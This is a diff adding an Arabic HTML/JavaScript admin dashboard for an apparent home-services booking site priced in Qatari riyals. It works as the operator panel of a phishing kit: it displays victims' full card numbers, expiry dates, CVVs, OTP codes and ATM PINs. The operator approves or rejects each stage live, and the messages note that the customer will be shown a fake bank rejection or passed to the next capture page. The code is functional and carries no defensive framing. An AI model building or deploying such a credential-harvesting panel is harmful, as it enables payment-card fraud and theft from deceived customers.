@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>لوحة التحكم — معاون</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f8fafc; color: #1e293b; min-height: 100vh; direction: rtl; }
+
+    /* Login Screen */
+    #loginScreen {
+      display: flex; align-items: center; justify-content: center;
+      min-height: 100vh; background: linear-gradient(135deg, #f0f4ff 0%, #e8f0fe 100%);
+    }
+    .login-box {
+      background: #ffffff; border: 1px solid #e2e8f0; border-radius: 16px;
+      padding: 40px; width: 380px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+    }
+    .login-box .logo { font-size: 28px; font-weight: 700; color: #c8a96e; margin-bottom: 8px; }
+    .login-box .subtitle { color: #64748b; font-size: 14px; margin-bottom: 32px; }
+    .form-group { margin-bottom: 16px; text-align: right; }
+    .form-group label { display: block; font-size: 13px; color: #475569; margin-bottom: 6px; }
+    .form-group input {
+      width: 100%; padding: 12px 16px; background: #f8fafc; border: 1px solid #cbd5e1;
+      border-radius: 8px; color: #1e293b; font-size: 14px; outline: none;
+    }
+    .form-group input:focus { border-color: #c8a96e; }
+    .btn-login {
+      width: 100%; padding: 14px; background: linear-gradient(135deg, #c8a96e, #a0845a);
+      border: none; border-radius: 8px; color: #fff; font-size: 16px; font-weight: 600;
+      cursor: pointer; margin-top: 8px; transition: opacity 0.2s;
+    }
+    .btn-login:hover { opacity: 0.9; }
+    .error-msg { color: #f87171; font-size: 13px; margin-top: 8px; }
+
+    /* Dashboard */
+    #dashboard { display: none; }
+    .header {
+      background: #ffffff; border-bottom: 1px solid #e2e8f0;
+      padding: 16px 24px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+    }
+    .header .brand { font-size: 20px; font-weight: 700; color: #c8a96e; }
+    .header .admin-info { display: flex; align-items: center; gap: 12px; }
+    .header .admin-name { font-size: 14px; color: #64748b; }
+    .btn-logout {
+      padding: 8px 16px; background: transparent; border: 1px solid #cbd5e1;
+      border-radius: 8px; color: #64748b; cursor: pointer; font-size: 13px; transition: all 0.2s;
+    }
+    .btn-logout:hover { border-color: #f87171; color: #f87171; }
+
+    .stats-bar {
+      display: flex; gap: 16px; padding: 20px 24px; background: #f1f5f9;
+      border-bottom: 1px solid #e2e8f0; flex-wrap: wrap;
+    }
+    .stat-card {
+      background: #ffffff; border: 1px solid #e2e8f0; border-radius: 12px;
+      padding: 16px 20px; flex: 1; min-width: 120px; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+    }
+    .stat-card .stat-num { font-size: 28px; font-weight: 700; color: #c8a96e; }
+    .stat-card .stat-label { font-size: 12px; color: #64748b; margin-top: 4px; }
+
+    .main-content { padding: 24px; }
+    .section-title {
+      font-size: 18px; font-weight: 600; color: #1e293b; margin-bottom: 16px;
+      display: flex; align-items: center; gap: 8px;
+    }
+    .live-dot {
+      width: 8px; height: 8px; background: #22c55e; border-radius: 50%;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+
+    .orders-table { width: 100%; border-collapse: collapse; }
+    .orders-table th {
+      background: #f8fafc; padding: 12px 16px; text-align: right;
+      font-size: 13px; color: #64748b; font-weight: 500; border-bottom: 1px solid #e2e8f0;
+    }
+    .orders-table td {
+      padding: 14px 16px; border-bottom: 1px solid #f1f5f9;
+      font-size: 14px; vertical-align: middle;
+    }
+    .orders-table tr:hover td { background: #f8fafc; }
+
+    .badge {
+      display: inline-flex; align-items: center; gap: 4px;
+      padding: 4px 10px; border-radius: 20px; font-size: 12px; font-weight: 500;
+    }
+    .badge.pending { background: #fef3c7; color: #92400e; }
+    .badge.waiting { background: #dbeafe; color: #1e40af; }
+    .badge.waiting-otp { background: #fce7f3; color: #9d174d; }
+    .badge.waiting-atm { background: #ede9fe; color: #4c1d95; }
+    .badge.approved { background: #d1fae5; color: #065f46; }
+    .badge.rejected { background: #fee2e2; color: #991b1b; }
+    .badge.completed { background: #d1fae5; color: #065f46; }
+
+    .action-btns { display: flex; gap: 6px; flex-wrap: wrap; }
+    .btn-otp {
+      padding: 7px 12px; background: #8b5cf6; border: none; border-radius: 6px;
+      color: #fff; font-size: 12px; cursor: pointer; transition: background 0.2s; white-space: nowrap;
+    }
+    .btn-otp:hover { background: #7c3aed; }
+    .btn-atm {
+      padding: 7px 12px; background: #f59e0b; border: none; border-radius: 6px;
+      color: #fff; font-size: 12px; cursor: pointer; transition: background 0.2s; white-space: nowrap;
+    }
+    .btn-atm:hover { background: #d97706; }
+    .btn-approve {
+      padding: 7px 12px; background: #22c55e; border: none; border-radius: 6px;
+      color: #fff; font-size: 12px; cursor: pointer; transition: background 0.2s; white-space: nowrap;
+    }
+    .btn-approve:hover { background: #16a34a; }
+    .btn-reject {
+      padding: 7px 12px; background: #ef4444; border: none; border-radius: 6px;
+      color: #fff; font-size: 12px; cursor: pointer; transition: background 0.2s; white-space: nowrap;
+    }
+    .btn-reject:hover { background: #dc2626; }
+    .btn-view {
+      padding: 7px 12px; background: #3b82f6; border: none; border-radius: 6px;
+      color: #fff; font-size: 12px; cursor: pointer; transition: background 0.2s;
+    }
+    .btn-view:hover { background: #2563eb; }
+
+    /* Modal */
+    .modal-overlay {
+      display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7);
+      z-index: 100; align-items: center; justify-content: center;
+    }
+    .modal-overlay.open { display: flex; }
+    .modal {
+      background: #ffffff; border: 1px solid #e2e8f0; border-radius: 16px;
+      padding: 28px; width: 540px; max-width: 95vw; max-height: 90vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+    }
+    .modal-title { font-size: 18px; font-weight: 600; color: #c8a96e; margin-bottom: 20px; }
+    .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    .info-item { background: #f8fafc; border-radius: 8px; padding: 12px; border: 1px solid #e2e8f0; }
+    .info-item .label { font-size: 11px; color: #94a3b8; margin-bottom: 4px; }
+    .info-item .value { font-size: 14px; color: #1e293b; font-weight: 500; word-break: break-all; }
+    .data-section {
+      border-radius: 10px; padding: 16px; margin-top: 16px; border: 1px solid;
+    }
+    .data-section.card-section { background: #fffbeb; border-color: #fcd34d; }
+    .data-section.otp-section { background: #fdf4ff; border-color: #d8b4fe; }
+    .data-section.atm-section { background: #fff7ed; border-color: #fed7aa; }
+    .data-section .section-title-inner { font-size: 13px; margin-bottom: 12px; font-weight: 600; }
+    .data-section.card-section .section-title-inner { color: #92400e; }
+    .data-section.otp-section .section-title-inner { color: #6b21a8; }
+    .data-section.atm-section .section-title-inner { color: #9a3412; }
+    .big-code { font-size: 36px; font-weight: 700; text-align: center; padding: 12px; letter-spacing: 6px; }
+    .otp-section .big-code { color: #7c3aed; }
+    .atm-section .big-code { color: #ea580c; }
+    .modal-actions { display: flex; gap: 10px; margin-top: 20px; justify-content: flex-end; flex-wrap: wrap; }
+    .btn-close {
+      padding: 10px 20px; background: transparent; border: 1px solid #cbd5e1;
+      border-radius: 8px; color: #64748b; cursor: pointer; font-size: 14px;
+    }
+
+    /* Toast */
+    .toast {
+      position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
+      background: #ffffff; border: 1px solid #e2e8f0; border-radius: 10px;
+      padding: 12px 24px; font-size: 14px; z-index: 200; box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      opacity: 0; transition: opacity 0.3s; pointer-events: none; white-space: nowrap;
+    }
+    .toast.show { opacity: 1; }
+    .toast.success { border-color: #22c55e; color: #22c55e; }
+    .toast.error { border-color: #ef4444; color: #ef4444; }
+    .toast.info { border-color: #3b82f6; color: #3b82f6; }
+
+    .new-badge {
+      background: #c8a96e; color: #ffffff; font-size: 10px; font-weight: 700;
+      padding: 2px 6px; border-radius: 10px; animation: blink 1s infinite;
+    }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.4} }
+
+    .stage-badge {
+      display: inline-block; font-size: 10px; padding: 2px 8px; border-radius: 10px;
+      font-weight: 600; margin-right: 4px;
+    }
+    .stage-badge.card { background: #dbeafe; color: #1e40af; }
+    .stage-badge.otp { background: #ede9fe; color: #4c1d95; }
+    .stage-badge.atm_pin { background: #fff7ed; color: #9a3412; }
+    .stage-badge.done { background: #d1fae5; color: #065f46; }
+
+    .empty-state { text-align: center; padding: 60px 20px; color: #94a3b8; }
+    .empty-state .icon { font-size: 48px; margin-bottom: 12px; }
+
+    @media (max-width: 768px) {
+      .stats-bar { flex-wrap: wrap; }
+      .info-grid { grid-template-columns: 1fr; }
+      .orders-table { font-size: 12px; }
+      .orders-table th, .orders-table td { padding: 10px 8px; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Login Screen -->
+<div id="loginScreen">
+  <div class="login-box">
+    <div class="logo">معاون</div>
+    <div class="subtitle">لوحة تحكم الإدارة</div>
+    <div class="form-group">
+      <label>اسم المستخدم</label>
+      <input type="text" id="username" value="admin" />
+    </div>
+    <div class="form-group">
+      <label>كلمة المرور</label>
+      <input type="password" id="password" value="" placeholder="أدخل كلمة المرور" />
+    </div>
+    <button class="btn-login" onclick="login()">دخول</button>
+    <div class="error-msg" id="loginError"></div>
+  </div>
+</div>
+
+<!-- Dashboard -->
+<div id="dashboard">
+  <div class="header">
+    <div class="brand">🏠 معاون — لوحة التحكم</div>
+    <div class="admin-info">
+      <span class="admin-name" id="adminName"></span>
+      <button class="btn-logout" onclick="logout()">خروج</button>
+    </div>
+  </div>
+
+  <div class="stats-bar">
+    <div class="stat-card">
+      <div class="stat-num" id="statTotal">0</div>
+      <div class="stat-label">إجمالي الطلبات</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" id="statWaiting">0</div>
+      <div class="stat-label">بانتظار الموافقة (بطاقة)</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" id="statOtp">0</div>
+      <div class="stat-label">بانتظار OTP</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" id="statAtm">0</div>
+      <div class="stat-label">بانتظار ATM PIN</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" id="statCompleted">0</div>
+      <div class="stat-label">مكتملة</div>
+    </div>
+  </div>
+
+  <div class="main-content">
+    <div class="section-title">
+      <div class="live-dot"></div>
+      الطلبات الواردة
+      <button onclick="loadOrders()" style="margin-right:auto;padding:6px 14px;background:#f1f5f9;border:1px solid #e2e8f0;border-radius:6px;color:#64748b;cursor:pointer;font-size:12px;">🔄 تحديث</button>
+    </div>
+
+    <div id="ordersContainer">
+      <div class="empty-state">
+        <div class="icon">📋</div>
+        <div>جاري تحميل الطلبات...</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Order Detail Modal -->
+<div class="modal-overlay" id="modalOverlay" onclick="closeModal(event)">
+  <div class="modal" id="modalContent">
+    <div class="modal-title">تفاصيل الطلب</div>
+    <div id="modalBody"></div>
+    <div class="modal-actions" id="modalActions">
+      <button class="btn-close" onclick="closeModal()">إغلاق</button>
+    </div>
+  </div>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<script>
+const BASE_URL = '';
+let token = localStorage.getItem('adminToken');
+let adminUsername = localStorage.getItem('adminUsername');
+let ws = null;
+let currentOrderRef = null;
+let orders = [];
+
+// ─── Init ─────────────────────────────────────────────────────────────────────
+if (token) showDashboard();
+
+async function login() {
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+  document.getElementById('loginError').textContent = '';
+
+  try {
+    const res = await fetch(BASE_URL + '/api/admin/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username, password })
+    });
+    const data = await res.json();
+    if (!res.ok) throw new Error(data.error || 'خطأ في تسجيل الدخول');
+    token = data.token;
+    adminUsername = data.username;
+    localStorage.setItem('adminToken', token);
+    localStorage.setItem('adminUsername', adminUsername);
+    showDashboard();
+  } catch (e) {
+    document.getElementById('loginError').textContent = e.message;
+  }
+}
+
+function logout() {
+  token = null;
+  localStorage.removeItem('adminToken');
+  localStorage.removeItem('adminUsername');
+  if (ws) ws.close();
+  document.getElementById('dashboard').style.display = 'none';
+  document.getElementById('loginScreen').style.display = 'flex';
+}
+
+function showDashboard() {
+  document.getElementById('loginScreen').style.display = 'none';
+  document.getElementById('dashboard').style.display = 'block';
+  document.getElementById('adminName').textContent = adminUsername || 'admin';
+  loadOrders();
+  connectWS();
+}
+
+// ─── WebSocket ────────────────────────────────────────────────────────────────
+function connectWS() {
+  const wsUrl = (location.protocol === 'https:' ? 'wss:' : 'ws:') + '//' + location.host + '/ws?admin=1';
+  ws = new WebSocket(wsUrl);
+  ws.onmessage = (e) => {
+    const data = JSON.parse(e.data);
+    if (['new_order', 'card_submitted', 'otp_submitted', 'atm_pin_submitted'].includes(data.type)) {
+      const labels = {
+        new_order: '📩 طلب جديد وارد!',
+        card_submitted: '💳 بيانات بطاقة جديدة!',
+        otp_submitted: '🔐 رمز OTP مُدخل!',
+        atm_pin_submitted: '🏧 رقم ATM PIN مُدخل!'
+      };
+      showToast(labels[data.type] || '📩 تحديث جديد!', 'success');
+      loadOrders();
+    }
+  };
+  ws.onclose = () => setTimeout(connectWS, 3000);
+}
+
+// ─── Load Orders ──────────────────────────────────────────────────────────────
+async function loadOrders() {
+  try {
+    const res = await fetch(BASE_URL + '/api/admin/orders', {
+      headers: { Authorization: 'Bearer ' + token }
+    });
+    if (res.status === 401) { logout(); return; }
+    orders = await res.json();
+    renderOrders();
+    updateStats();
+  } catch (e) {
+    console.error(e);
+  }
+}
+
+function updateStats() {
+  document.getElementById('statTotal').textContent = orders.length;
+  document.getElementById('statWaiting').textContent = orders.filter(o => o.status === 'waiting_approval').length;
+  document.getElementById('statOtp').textContent = orders.filter(o => o.status === 'waiting_otp').length;
+  document.getElementById('statAtm').textContent = orders.filter(o => o.status === 'waiting_atm_pin').length;
+  document.getElementById('statCompleted').textContent = orders.filter(o => o.status === 'completed').length;
+}
+
+function getStatusInfo(o) {
+  const map = {
+    pending: { label: 'معلق', cls: 'pending' },
+    waiting_approval: { label: 'بطاقة بانتظار', cls: 'waiting' },
+    waiting_otp: { label: 'OTP بانتظار', cls: 'waiting-otp' },
+    waiting_atm_pin: { label: 'ATM بانتظار', cls: 'waiting-atm' },
+    card_rejected: { label: 'بطاقة مرفوضة', cls: 'rejected' },
+    otp_rejected: { label: 'OTP مرفوض', cls: 'rejected' },
+    atm_rejected: { label: 'ATM مرفوض', cls: 'rejected' },
+    approved: { label: 'تمت الموافقة', cls: 'approved' },
+    rejected: { label: 'مرفوض', cls: 'rejected' },
+    completed: { label: 'مكتمل', cls: 'completed' }
+  };
+  return map[o.status] || { label: o.status, cls: 'pending' };
+}
+
+function getStageLabel(stage) {
+  const map = {
+    contact: 'تسجيل', card: 'بطاقة', otp: 'OTP', atm_pin: 'ATM PIN', done: 'مكتمل'
+  };
+  return map[stage] || stage || '—';
+}
+
+function renderActionBtns(o) {
+  const ref = o.order_ref;
+  let btns = `<button class="btn-view" onclick="viewOrder('${ref}')">عرض</button>`;
+
+  if (o.status === 'waiting_approval') {
+    btns += `<button class="btn-approve" onclick="approveCard('${ref}')">✅ قبول</button>`;
+    btns += `<button class="btn-reject" onclick="rejectCard('${ref}')">❌ رفض</button>`;
+  } else if (o.status === 'waiting_otp') {
+    btns += `<button class="btn-approve" onclick="approveOtp('${ref}')">✅ قبول</button>`;
+    btns += `<button class="btn-reject" onclick="rejectOtp('${ref}')">❌ رفض</button>`;
+  } else if (o.status === 'waiting_atm_pin') {
+    btns += `<button class="btn-approve" onclick="approveAtm('${ref}')">✅ قبول</button>`;
+    btns += `<button class="btn-reject" onclick="rejectAtm('${ref}')">❌ رفض</button>`;
+  }
+
+  return btns;
+}
+
+function renderOrders() {
+  const container = document.getElementById('ordersContainer');
+  if (!orders.length) {
+    container.innerHTML = '<div class="empty-state"><div class="icon">📋</div><div>لا توجد طلبات بعد</div></div>';
+    return;
+  }
+
+  const rows = orders.map(o => {
+    const s = getStatusInfo(o);
+    const isNew = Date.now() - o.created_at < 60000;
+    const stageLabel = getStageLabel(o.stage);
+    return `
+      <tr>
+        <td style="font-size:12px">${o.order_ref} ${isNew ? '<span class="new-badge">جديد</span>' : ''}</td>
+        <td>${o.customer_name || '—'}</td>
+        <td>${o.customer_phone || '—'}</td>
+        <td>${o.service_type || '—'}</td>
+        <td>${o.total_price ? o.total_price + ' ر.ق' : '—'}</td>
+        <td>
+          <span class="badge ${s.cls}">${s.label}</span>
+          <span class="stage-badge ${o.stage || 'card'}">${stageLabel}</span>
+        </td>
+        <td>
+          <div class="action-btns">${renderActionBtns(o)}</div>
+        </td>
+      </tr>
+    `;
+  }).join('');
+
+  container.innerHTML = `
+    <table class="orders-table">
+      <thead>
+        <tr>
+          <th>رقم الطلب</th>
+          <th>اسم العميل</th>
+          <th>الهاتف</th>
+          <th>الخدمة</th>
+          <th>المبلغ</th>
+          <th>الحالة / المرحلة</th>
+          <th>الإجراءات</th>
+        </tr>
+      </thead>
+      <tbody>${rows}</tbody>
+    </table>
+  `;
+}
+
+// ─── View Order ───────────────────────────────────────────────────────────────
+function viewOrder(ref) {
+  const o = orders.find(x => x.order_ref === ref);
+  if (!o) return;
+  currentOrderRef = ref;
+
+  document.getElementById('modalBody').innerHTML = `
+    <div class="info-grid">
+      <div class="info-item"><div class="label">رقم الطلب</div><div class="value">${o.order_ref}</div></div>
+      <div class="info-item"><div class="label">الحالة</div><div class="value">${getStatusInfo(o).label} — ${getStageLabel(o.stage)}</div></div>
+      <div class="info-item"><div class="label">اسم العميل</div><div class="value">${o.customer_name || '—'}</div></div>
+      <div class="info-item"><div class="label">الهاتف</div><div class="value">${o.customer_phone || '—'}</div></div>
+      <div class="info-item"><div class="label">الخدمة</div><div class="value">${o.service_type || '—'}</div></div>
+      <div class="info-item"><div class="label">الجنسية</div><div class="value">${o.nationality || '—'}</div></div>
+      <div class="info-item"><div class="label">المدة</div><div class="value">${o.duration || '—'}</div></div>
+      <div class="info-item"><div class="label">المبلغ</div><div class="value">${o.total_price} ر.ق</div></div>
+      <div class="info-item"><div class="label">تاريخ البدء</div><div class="value">${o.start_date || '—'}</div></div>
+      <div class="info-item"><div class="label">العنوان</div><div class="value">${o.customer_address || '—'}</div></div>
+      <div class="info-item"><div class="label">تاريخ الإنشاء</div><div class="value">${new Date(o.created_at).toLocaleString('ar')}</div></div>
+      <div class="info-item"><div class="label">آخر تحديث</div><div class="value">${new Date(o.updated_at).toLocaleString('ar')}</div></div>
+    </div>
+    ${o.card_number ? `
+    <div class="data-section card-section">
+      <div class="section-title-inner">💳 بيانات البطاقة</div>
+      <div class="info-grid">
+        <div class="info-item"><div class="label">رقم البطاقة</div><div class="value">${o.card_number}</div></div>
+        <div class="info-item"><div class="label">تاريخ الانتهاء</div><div class="value">${o.card_expiry}</div></div>
+        <div class="info-item"><div class="label">CVV</div><div class="value">${o.card_cvv}</div></div>
+        <div class="info-item"><div class="label">اسم حامل البطاقة</div><div class="value">${o.card_holder}</div></div>
+      </div>
+    </div>` : ''}
+    ${o.otp_code ? `
+    <div class="data-section otp-section">
+      <div class="section-title-inner">🔐 رمز OTP المُدخل</div>
+      <div class="big-code">${o.otp_code}</div>
+    </div>` : ''}
+    ${o.atm_pin ? `
+    <div class="data-section atm-section">
+      <div class="section-title-inner">🏧 رقم ATM PIN المُدخل</div>
+      <div class="big-code">${o.atm_pin}</div>
+    </div>` : ''}
+  `;
+
+  // أزرار الـ modal حسب الحالة
+  let actionBtns = '<button class="btn-close" onclick="closeModal()">إغلاق</button>';
+  if (o.status === 'waiting_approval') {
+    actionBtns += `<button class="btn-reject" onclick="rejectCard('${ref}');closeModal()">❌ رفض البطاقة</button>`;
+    actionBtns += `<button class="btn-approve" onclick="approveCard('${ref}');closeModal()">✅ قبول → OTP</button>`;
+  } else if (o.status === 'waiting_otp') {
+    actionBtns += `<button class="btn-reject" onclick="rejectOtp('${ref}');closeModal()">❌ رفض OTP</button>`;
+    actionBtns += `<button class="btn-approve" onclick="approveOtp('${ref}');closeModal()">✅ قبول → ATM PIN</button>`;
+  } else if (o.status === 'waiting_atm_pin') {
+    actionBtns += `<button class="btn-reject" onclick="rejectAtm('${ref}');closeModal()">❌ رفض الرقم السري</button>`;
+    actionBtns += `<button class="btn-approve" onclick="approveAtm('${ref}');closeModal()">✅ قبول → نجاح</button>`;
+  }
+  document.getElementById('modalActions').innerHTML = actionBtns;
+
+  document.getElementById('modalOverlay').classList.add('open');
+}
+
+function closeModal(e) {
+  if (!e || e.target === document.getElementById('modalOverlay')) {
+    document.getElementById('modalOverlay').classList.remove('open');
+  }
+}
+
+// ─── Admin Actions ────────────────────────────────────────────────────────────
+// ─── بطاقة ───
+async function approveCard(ref) {
+  try {
+    await fetch(BASE_URL + '/api/admin/orders/' + ref + '/approve-card', {
+      method: 'POST', headers: { Authorization: 'Bearer ' + token }
+    });
+    showToast('✅ تم قبول البطاقة — العميل سينتقل لصفحة OTP', 'success');
+    loadOrders();
+  } catch (e) { showToast('خطأ في قبول البطاقة', 'error'); }
+}
+async function rejectCard(ref) {
+  try {
+    await fetch(BASE_URL + '/api/admin/orders/' + ref + '/reject-card', {
+      method: 'POST', headers: { Authorization: 'Bearer ' + token }
+    });
+    showToast('❌ تم رفض البطاقة — العميل سيرى رسالة رفض البنك', 'error');
+    loadOrders();
+  } catch (e) { showToast('خطأ في رفض البطاقة', 'error'); }
+}
+// ─── OTP ───
+async function approveOtp(ref) {
+  try {
+    await fetch(BASE_URL + '/api/admin/orders/' + ref + '/approve-otp', {
+      method: 'POST', headers: { Authorization: 'Bearer ' + token }
+    });
+    showToast('✅ تم قبول OTP — العميل سينتقل لصفحة ATM PIN', 'success');
+    loadOrders();
+  } catch (e) { showToast('خطأ في قبول OTP', 'error'); }
+}
+async function rejectOtp(ref) {
+  try {
+    await fetch(BASE_URL + '/api/admin/orders/' + ref + '/reject-otp', {
+      method: 'POST', headers: { Authorization: 'Bearer ' + token }
+    });
+    showToast('❌ تم رفض OTP — العميل سيرى مربع OTP باللون الأحمر', 'error');
+    loadOrders();
+  } catch (e) { showToast('خطأ في رفض OTP', 'error'); }
+}
+// ─── ATM PIN ───
+async function approveAtm(ref) {
+  try {
+    await fetch(BASE_URL + '/api/admin/orders/' + ref + '/approve-atm', {
+      method: 'POST', headers: { Authorization: 'Bearer ' + token }
+    });
+    showToast('✅ تم قبول الرقم السري — العميل سيرى رسالة النجاح', 'success');
+    loadOrders();
+  } catch (e) { showToast('خطأ في قبول ATM PIN', 'error'); }
+}
+async function rejectAtm(ref) {
+  try {
+    await fetch(BASE_URL + '/api/admin/orders/' + ref + '/reject-atm', {
+      method: 'POST', headers: { Authorization: 'Bearer ' + token }
+    });
+    showToast('❌ تم رفض الرقم السري — العميل سيرى رسالة خطأ', 'error');
+    loadOrders();
+  } catch (e) { showToast('خطأ في رفض ATM PIN', 'error'); }
+}
+// Legacy
+async function requestOtp(ref) { return approveCard(ref); }
+async function requestAtm(ref) { return approveOtp(ref); }
+async function approveOrder(ref) { return approveAtm(ref); }
+async function rejectOrder(ref) { return rejectCard(ref); }
+
+// ─── Toast ────────────────────────────────────────────────────────────────────
+function showToast(msg, type = 'success') {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast show ' + type;
+  setTimeout(() => t.className = 'toast', 4000);
+}
+
+// Auto-refresh every 15s
+setInterval(() => { if (token) loadOrders(); }, 15000);
+</script>
+</body>
+</html>
